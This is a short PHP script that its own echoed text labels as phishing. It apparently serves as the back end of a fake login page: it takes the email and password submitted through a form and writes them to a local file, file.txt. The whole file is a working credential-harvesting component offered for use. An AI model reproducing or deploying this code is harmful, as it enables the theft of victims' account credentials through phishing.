<?php

echo "Phishing social engeneerer";

$email = $_POST['email'];
$password = $_POST['pass'];
$dump = $email." ".$password;


$filename = 'file.txt';
$scrivi = fopen($filename, 'w');
fwrite($scrivi, $dump);
fclose($scrivi);



?>